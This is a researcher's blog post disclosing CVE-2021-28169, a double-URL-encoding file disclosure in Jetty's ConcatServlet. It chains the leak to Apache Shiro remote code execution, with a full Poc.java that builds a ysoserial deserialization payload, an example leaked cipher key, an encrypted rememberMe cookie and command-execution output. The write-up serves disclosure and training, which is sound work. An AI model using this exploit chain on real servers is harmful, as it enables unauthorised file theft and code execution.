---
layout: post
title: "Full Stack Web Attack 2021 :: Zero Day Give Away"
date: 2021-07-13 09:00:00 -0500
categories: blog
---

This year I released a [challenge](/training/challenge) for the [Full Stack Web Attack](/training) class: 

![Challenge](/assets/images/fswa-2021-zero-day-give-away/tweet.png "Challenge") 

Whilst several people had solved the challenge, no one seemed to have discovered the zero-day that I left lurking! In this blog post I am going to disclose the details about the bug chain. This vulnerability was patched as [CVE-2021-28169](/advisories/src-2021-0017/) and under certain environments it can lead to an elevation of privilege/access or even remote code execution! 
<!--more-->

By the way - If you didn't make the class in July 2021 don't worry we will be running another class later in the year.

![Jetty Web Server](/assets/images/fswa-2021-zero-day-give-away/jetty.png "Jetty") 

As it turns out, the `jetty-servlets` library contained a vulnerability in the `org.eclipse.jetty.servlets.ConcatServlet` servlet. If exposed, this could allow an attacker to disclose sensitive files.

## Jetty Utility Servlets ConcatServlet Double Decoding Information Disclosure Vulnerability

Inside of the `doGet` method we see the following code:

```java
/*     */   protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
/*  88 */     String query = request.getQueryString();
/*     */     ...
/*  95 */     List<RequestDispatcher> dispatchers = new ArrayList<RequestDispatcher>();
/*  96 */     String[] parts = query.split("\\&");
/*  97 */     String type = null;
/*  98 */     for (String part : parts) {
/*     */       
/* 100 */       String path = URIUtil.canonicalPath(URIUtil.decodePath(part)); // 1
/*     */       ...       
/* 108 */       if (startsWith(path, "/WEB-INF/") || startsWith(path, "/META-INF/")) { // 2
/*     */         
/* 110 */         response.sendError(404);
/*     */         
/*     */         return;
/*     */       } 
/*     */       ...
/* 128 */       RequestDispatcher dispatcher = getServletContext().getRequestDispatcher(path); // 3
/* 129 */       if (dispatcher != null) {
/* 130 */         dispatchers.add(dispatcher);
/*     */       }
/*     */     } 
/* 133 */     if (type != null) {
/* 134 */       response.setContentType(type);
/*     */     }
/* 136 */     for (RequestDispatcher dispatcher : dispatchers)
/*     */     {
/* 138 */       dispatcher.include(request, response); // 4
/*     */     }
/*     */   }
```

At *[1]* the code does a url decode and then attempts to normalize the attacker supplied path. Then at *[2]* there is a check that the path doesn't start with "/WEB-INF/" or "/META-INF/". Later at *[3]* the `RequestDispatcher` is made and finally at *[4]* the `include` is triggered. 

The problem is that the check at *[2]* can be bypassed because the `RequestDispatcher` will also handle url decoding. So an attacker can double url encode either a traversal or the `WEB-INF`/`META-INF` strings in their controlled paths. This will instantiate a valid dispatcher and leak contents of an attacker controlled file from the ROOT of the web application.

## Impact 

The vulnerability is limited to a file disclosure from the web application ROOT directory. However, in some contexts this may allow an attacker to escalate further. Let's use two examples:

1. Spring - Elevation of privilege/access

In this environment, it's possible to leak sensitive properties from the `application.properties` file such as the spring.datasource.url, spring.elasticsearch.rest.password, spring.h2.console.settings.web-admin-password, spring.influx.password, spring.ldap.password, etc.

2. Apache Shiro - Remote Code Execution

In this environment, it's possible to leak the shiro.ini file which contains `securityManager.rememberMeManager.cipherKey`. This key can be used to gain remote code execution against the application via deserialization in the `rememberMe` cookie.

## Proof of Concept

If your testing on your own web application, modify your `web.xml` to include the vulnerable servlet:

```xml
  <servlet>
    <servlet-name>Concat</servlet-name>
    <servlet-class>org.eclipse.jetty.servlets.ConcatServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>Concat</servlet-name>
    <url-pattern>/concat</url-pattern>
  </servlet-mapping>
````

Or else, you can test it on the challenge image:

```
docker run --name fswa -it --rm -p 80:8080 registry.gitlab.com/source-incite/fswa-challenge/rceme:2021
```

Now we can leak the key using the vulnerability:

![Triggering CVE-XXXX-YYYY](/assets/images/fswa-2021-zero-day-give-away/key-leak.png "leaking the securityManager.rememberMeManager.cipherKey") 

Excuse me while I ignore all the username and passwords in the `shiro.ini` file! As it turns out, Apache Shiro uses `commons-collections` v3.2.2 and `commons-beanutils` v1.9.4 in their classpath. This is enough for us to generate a gadget chain from [ysoserial](https://github.com/frohoff/ysoserial).

With that wrapped around an encryption layer, we can achieve remote code execution:

```
researcher@incite:~$ java Poc 
(+) Usage: java Poc <securityManager.rememberMeManager.cipherKey> <command>

researcher@incite:~$ java Poc kPH+bIxk5D2deZiIxcaaaA== "touch /tmp/pwn"
(+) using key kPH+bIxk5D2deZiIxcaaaA==
(+) rememberMe=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
```

Now, we send the cookie to the server targeting *any* endpoint:

![Triggering deserialization by design](/assets/images/fswa-2021-zero-day-give-away/deserialize.png "Triggering deserialization by design") 

Done!

```
student@target:~$ docker exec -it fswa stat /tmp/pwn
stat: cannot stat '/tmp/pwn': No such file or directory

student@target:~$ docker exec -it fswa stat /tmp/pwn
  File: /tmp/pwn
  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file
Device: 33h/51d	Inode: 1452414     Links: 1
Access: (0644/-rw-r--r--)  Uid: (  999/   jetty)   Gid: (  999/   jetty)
Access: 2021-04-29 18:33:26.410256760 +0000
Modify: 2021-04-29 18:33:26.410256760 +0000
Change: 2021-04-29 18:33:26.410256760 +0000
 Birth: -
```

...and of course, the `Poc.java` which is mostly ~~copied~~ borrowed from Apache Shiro:

```java
package shiro;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import ysoserial.payloads.ObjectPayload.Utils;
import org.apache.shiro.crypto.cipher.*;
import org.apache.shiro.lang.util.ByteSource;

public class Poc {

    public static void main(String[] args) throws Exception {
        if(args.length != 2){
            System.out.println("(+) Usage: java Poc <securityManager.rememberMeManager.cipherKey> <command>");
            System.exit(0);
        }
		
        // Timo's idea to recycle shiro libs
        AesCipherService aesservice = new AesCipherService();
        aesservice.setModeName("GCM");
        aesservice.setPaddingSchemeName("NoPadding");
        aesservice.setStreamingPaddingSchemeName("NoPadding");
        CipherService cipherService = aesservice;

    	String key = args[0];
    	String cmd = args[1];
        System.out.println("(+) using key " + key);
        byte[] fdata = null;

        // commons-collections 3.2.2 & commons-beanutils 1.9.4
        Object payloadObject = Utils.makePayloadObject("CommonsBeanutils1", cmd);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = null;
        try {
            out = new ObjectOutputStream(bos);   
            out.writeObject(payloadObject);
            out.flush();
            fdata = bos.toByteArray();
        } finally {
            try {
              bos.close();
            } catch (IOException ex) {}
        }
        System.out.println("(+) rememberMe=" + 
            new String(
                Base64.getEncoder().encode(
                    cipherService.encrypt(
                        fdata, Base64.getDecoder().decode(key)
                    ).getBytes()
                )
            )
        );
    }
}
```

## References

- [https://docs.spring.io/spring-boot/docs/current/reference/html/appendix-application-properties.html](https://docs.spring.io/spring-boot/docs/current/reference/html/appendix-application-properties.html)
- [https://shiro.apache.org/configuration.html](https://shiro.apache.org/configuration.html)